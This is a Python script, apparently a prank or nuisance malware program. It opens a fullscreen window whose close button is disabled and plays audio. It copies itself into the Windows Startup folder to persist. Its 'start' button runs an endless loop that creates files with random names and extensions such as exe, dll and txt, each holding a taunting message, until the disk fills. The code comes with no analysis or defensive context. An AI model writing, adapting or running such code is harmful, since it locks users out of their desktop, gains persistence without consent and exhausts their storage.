import os
from random import *
from tkinter import *
from playsound import playsound
from pygame import mixer
import shutil

mixer.init()
mixer.music.load("s.mp3")
mixer.music.play()

windows = Tk()
windows.attributes('-fullscreen', True)
# windows.maxsize(width=700, height=700)
windows.resizable(False, False)


def sound():
    playsound('calm.wav')


def disable_events():
    pass


windows.protocol("WM_DELETE_WINDOW", disable_events)
file = os.path.basename(__file__)
path = r"C:\Users\USER\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"
shutil.move(file, path)


def fill():
    letters = 'qeq8w0987654hfmkbnktcknhxgjkgjtiutu321'
    ending = ['exe', 'py', 'txt', 'dll', 'mp4', 'ogg', 'mp3', 'bat', 'apk', 'pkg', 'db', 'html', 'php', 'js', 'css']
    i = 2
    while i > 0:
        i += 1
        fil = "".join(choice(letters) for _ in range(randint(100, 110)))
        end = ending[randint(0, 5)]
        with open(fil + '.' + end, 'a') as f:
            f.write('''
                            Hello, If you are seeing this, it means that i love you.
                            Please don't be surprised. I am just filling your computer to get it filled.
                            Do not just download apps from any place. Make sure you you know what you are downloading. 
                            BYE From Pc
                            Stay safe and stay well
                            Table of Contents
            ''')
            f.close()
    print('done')
    return


ie = Frame(width=1200, height=700, bg='teal')
ie.pack()
ie.pack_propagate(False)
btn = Button(ie, text="start", width=70, command=fill)
btn.place(x=400, y=180)
windows.mainloop()
